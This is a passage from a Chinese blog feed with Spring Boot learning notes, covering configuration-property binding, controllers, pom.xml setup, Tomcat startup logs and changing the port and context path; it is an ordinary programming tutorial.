class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.springboot008customerconfiguration.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span><span class="comment">//将此类交给Spring容器进行管理</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;school&quot;)</span><span class="comment">//核心配置文件里面的前缀</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">School</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String website;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWebsite</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> website;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWebsite</span><span class="params">(String website)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.website = website;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.springboot008customerconfiguration.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;department&quot;)</span><span class="comment">//核心配置文件里面的前缀</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Department</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String website;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getWebsite</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> website;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWebsite</span><span class="params">(String website)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.website = website;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后再创建一个IndexController.java 来输出结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.springboot008customerconfiguration.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> School school;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello1</span> <span class="operator">=</span> <span class="string">&quot;hello :&quot;</span> + department.getName() + <span class="string">&quot; Website : http://&quot;</span> + department.getWebsite();</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello2</span> <span class="operator">=</span> <span class="string">&quot;hello :&quot;</span> + school.getName() + <span class="string">&quot; Website : http://&quot;</span> + school.getWebsite();</span><br><span class="line">        <span class="keyword">return</span> hello2 + <span class="string">&quot;&lt;br&gt;&quot;</span> + hello1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样我们在浏览器输入<a target="_blank" rel="noopener" href="http://localhost:8080/say">http://localhost:8080/say</a> 就可以得到如下结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello :ECJTU Website : http://www.ecjtu.jx.cn</span><br><span class="line">hello :ECJTU1 Website : http://www.ecjtu1.jx.cn</span><br></pre></td></tr></table></figure><blockquote><p>此方法只能获取核心配置文件中有前缀的属性，若没有前缀的单独属性必须要用0x03的方法！！</p></blockquote><h3 id="0x0401-使用-ConfigurationProperties注解出现警告处理"><a href="#0x0401-使用-ConfigurationProperties注解出现警告处理" class="headerlink" title="0x0401 使用@ConfigurationProperties注解出现警告处理:"></a>0x0401 使用@ConfigurationProperties注解出现警告处理:</h3><p>当我们配置好School.java和Department.java这两个文件的时候IDEA上方会出现红色警告：</p><p><strong>未配置Spring Boot注解处理器</strong></p><p>但是这个并不影响我们代码的执行，如果要消除该警告，只需要在pom.xml配置文件中添加一个依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就没有上述的警告了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
          <category> SpringBoot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 后端 </tag>
            
            <tag> Spring </tag>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot 学习笔记 01</title>
      <link href="/2021/08/01/cfb2a88933dc-q1jun/"/>
      <url>/2021/08/01/cfb2a88933dc-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Boot学习笔记-01"><a href="#Spring-Boot学习笔记-01" class="headerlink" title="Spring Boot学习笔记 01"></a>Spring Boot学习笔记 01</h1><p>这是暑期学习第二天，从今天起我开始学习关于SpringBoot的框架，并将学习的内容写到博客上，供大家一起学习！</p><h2 id="0x01-Spring-Boot简介"><a href="#0x01-Spring-Boot简介" class="headerlink" title="0x01 Spring Boot简介"></a>0x01 Spring Boot简介</h2><p>​    Spring Boot是Spring家族中的一个全新的框架，它用来简化Spring应用程序的创建和开发过程，也可以说Spring Boot能简化我们之前采用（SSM）Spring+SpringMVC+Mybatis框架进行开发的过程。</p><p>​    在以往我们采用SSM框架进行开发的时候，搭建和整合三大框架，我们需要做很多工作，比如配置web.xml，配置Spring，配置mybatis，并将他们整合在一起，而SpringBoot框架对此开发过程进行了革命性的颠覆，完全抛弃了繁琐的xml配置过程，采用了大量的默认配置简化我们的开发过程。</p><p>​    所以采用SpringBoot可以非常容易和快速地创建基于Spring框架的应用程序，它让编码变简单了，配置变简单了，部署变简单了，监控变简单了。正因为Spring Boot化繁为简，让开发变得极其简单和快速，所以在业界变得备受关注。</p><h2 id="0x02-Spring-Boot的特性"><a href="#0x02-Spring-Boot的特性" class="headerlink" title="0x02 Spring Boot的特性"></a>0x02 Spring Boot的特性</h2><ul><li>能够快速创建基于Spring的应用程序</li><li>能够直接使用Java Main方法启动内嵌的Tomcat 服务器运行Spring Boot程序，不需要部署War包文件</li><li>提供约定的starter POM来简化 Maven 配置，让Maven配置变得简单</li><li>自动化配置，根据项目的Maven依赖配置，SpringBoot自动配置Spring、SpringMVC等等</li><li>提供了程序的健康检查等功能</li><li>基本可以完全不使用XML配置文件，采用注解配置</li></ul><h2 id="0x03-Spring-Boot-四大核心"><a href="#0x03-Spring-Boot-四大核心" class="headerlink" title="0x03 Spring Boot 四大核心"></a>0x03 Spring Boot 四大核心</h2><ul><li><p>自动配置</p></li><li><p>起步依赖</p></li><li><p>Actuator（健康检测）</p></li><li><p>命令行界面</p></li></ul><h2 id="0x04-创建SpringBoot项目"><a href="#0x04-创建SpringBoot项目" class="headerlink" title="0x04 创建SpringBoot项目"></a>0x04 创建SpringBoot项目</h2><p>IDEA新建SpringBoot项目，勾选Spring Web。</p><p>创建后SpringBoot项目中的POM.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringBoot父工程GAV坐标--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--当前项目的GAV坐标--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example.springboot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springboot001<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>springboot001<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编译级别--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        SpringBoot框架Web项目起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        SpringBoot框架测试起步依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            SpringBoot项目打包编译的插件--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot项目启动入口类：</p><p>src\main\java\com.example.springboot.springbootfirst\Springboot001Application.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springboot.springbootfirst;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="comment">//Springboot项目启动入口类</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span><span class="comment">//SpringBoot核心注解，主要用于开启spring自动配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Springboot001Application</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Springboot001Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>src\main\resources<ul><li>static(文件夹)：图标等静态资源放入此文件夹</li><li>templates(文件夹)：模板，前端模板引擎放入此文件夹Thyme leaf.html（百叶箱）</li><li>application.properties：SpringBoot的核心配置文件</li></ul></li></ul><blockquote><p>  Springboot项目代码必须放到Application(Springboot001Application)类所在的同级目录或者下级目录</p></blockquote><p>我们在com.example.springboot.springbootfirst下创建一个package Web，再在web这个包里面创建一个java类IndexController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springboot.springbootfirst.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/springboot/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello ,Springboot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完成之后我们编译Springboot001Application这个入口，观察控制台输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  .   ____          _            __ _ _</span><br><span class="line"> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="line">( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="line"> \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="line">  &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="line"> =========|_|==============|___/=/_/_/_/</span><br><span class="line"> :: Spring Boot ::                (v2.5.2)</span><br><span class="line"></span><br><span class="line">2021-07-21 17:09:53.836  INFO 10616 --- [           main] c.s.s.Springboot002SpringMvcApplication  : Starting Springboot002SpringMvcApplication using Java 11.0.10 on LAPTOP-47F3TRCJ with PID 10616 (C:\Users\段雅婷\Desktop\SpringBoot\springboot002-springMVC\target\classes started by 段雅婷 in C:\Users\段雅婷\Desktop\SpringBoot)</span><br><span class="line">2021-07-21 17:09:53.836  INFO 10616 --- [           main] c.s.s.Springboot002SpringMvcApplication  : No active profile set, falling back to default profiles: default</span><br><span class="line">2021-07-21 17:09:54.634  INFO 10616 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8080 (http)</span><br><span class="line">2021-07-21 17:09:54.650  INFO 10616 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]</span><br><span class="line">2021-07-21 17:09:54.650  INFO 10616 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.48]</span><br><span class="line">2021-07-21 17:09:54.697  INFO 10616 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext</span><br><span class="line">2021-07-21 17:09:54.697  INFO 10616 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 830 ms</span><br><span class="line">2021-07-21 17:09:54.931  INFO 10616 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path &#x27;&#x27;</span><br><span class="line">2021-07-21 17:09:54.931  INFO 10616 --- [           main] c.s.s.Springboot002SpringMvcApplication  : Started Springboot002SpringMvcApplication in 1.409 seconds (JVM running for 2.861)</span><br><span class="line">2021-07-21 17:10:38.256  INFO 10616 --- [nio-8080-exec-1] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [1626485908,1626487413,1626505943] that contained an invalid cookie. That cookie will be ignored.</span><br><span class="line"> Note: further occurrences of this error will be logged at DEBUG level.</span><br><span class="line">2021-07-21 17:10:38.261  INFO 10616 --- [nio-8080-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet &#x27;dispatcherServlet&#x27;</span><br><span class="line">2021-07-21 17:10:38.261  INFO 10616 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet &#x27;dispatcherServlet&#x27;</span><br><span class="line">2021-07-21 17:10:38.261  INFO 10616 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 0 ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 其中我们发现一条提示信息Tomcat started on port(s): 8080 (http) with context path ‘’</p><p>打开浏览器输入localhost:8080&#x2F;springboot&#x2F;say，观察到浏览器界面跳转到输出字符串“Hello ,Springboot!”。</p><p>这里我们完成了SpringBoot项目的搭建。</p><h2 id="0x05-使用SpringBoot的核心配置文件"><a href="#0x05-使用SpringBoot的核心配置文件" class="headerlink" title="0x05 使用SpringBoot的核心配置文件"></a>0x05 使用SpringBoot的核心配置文件</h2><p>上面我们说，其中一条信息为Tomcat started on port(s): 8080 (http) with context path ‘’，我们要如何修改这里的端口号和上下文默认路径呢？</p><p>我们打开src\main\resources中的<code>application.properties</code>文件并添加：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置内嵌Tomcat端口号</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment">#设置上下文根</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/springboot</span></span><br></pre></td></tr></table></figure><p>再重启Springboot项目，观察控制台输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .   ____          _            __ _ _</span><br><span class="line"> /\\ / ___&#x27;_ __ _ _(_)_ __  __ _ \ \ \ \</span><br><span class="line">( ( )\___ | &#x27;_ | &#x27;_| | &#x27;_ \/ _` | \ \ \ \</span><br><span class="line"> \\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class="line">  &#x27;  |____| .__|_| |_|_| |_\__, | / / / /</span><br><span class="line"> =========|_|==============|___/=/_/_/_/</span><br><span class="line"> :: Spring Boot ::                (v2.5.2)</span><br><span class="line"></span><br><span class="line">2021-07-21 17:32:42.607  INFO 15028 --- [           main] .s.s.Springboot003ContextPathApplication : Starting Springboot003ContextPathApplication using Java 1.8.0_181 on LAPTOP-47F3TRCJ with PID 15028 (C:\Users\段雅婷\Desktop\SpringBoot\springboot003-context-path\target\classes started by 段雅婷 in C:\Users\段雅婷\Desktop\SpringBoot)</span><br><span class="line">2021-07-21 17:32:42.610  INFO 15028 --- [           main] .s.s.Springboot003ContextPathApplication : No active profile set, falling back to default profiles: default</span><br><span class="line">2021-07-21 17:32:43.477  INFO 15028 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8081 (http)</span><br><span class="line">2021-07-21 17:32:43.493  INFO 15028 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]</span><br><span class="line">2021-07-21 17:32:43.493  INFO 15028 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.48]</span><br><span class="line">2021-07-21 17:32:43.554  INFO 15028 --- [           main] o.a.c.c.C.[.[localhost].[/springboot]    : Initializing Spring embedded WebApplicationContext</span><br><span class="line">2021-07-21 17:32:43.554  INFO 15028 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 893 ms</span><br><span class="line">2021-07-21 17:32:43.775  INFO 15028 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8081 (http) with context path &#x27;/springboot&#x27;</span><br><span class="line">2021-07-21 17:32:43.775  INFO 15028 --- [           main] .s.s.Springboot003ContextPathApplication : Started Springboot003ContextPathApplication in 1.607 seconds (JVM running for 2.537)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到<code> Tomcat started on port(s): 8081 (http) with context path &#39;/springboot&#39;</code> 修改端口号和默认路径成功。</p><p>如果我们要访问<a target="_blank" rel="noopener" href="http://localhost:8080/springboot/say">http://localhost:8080/springboot/say</a> 则要改成 <a target="_blank" rel="noopener" href="http://localhost:8080/springboot/springboot/say">http://localhost:8080/springboot/springboot/say</a> ，因为添加了默认路径。</p><blockquote><p>核心配置文件只能有一个</p></blockquote><h3 id="0x0501-使用-yml或-yaml的核心配置文件"><a href="#0x0501-使用-yml或-yaml的核心配置文件" class="headerlink" title="0x0501 使用.yml或.yaml的核心配置文件"></a>0x0501 使用.yml或.yaml的核心配置文件</h3><p>将application.properties换成application.yml:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p>将application.properties换成application.yaml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span 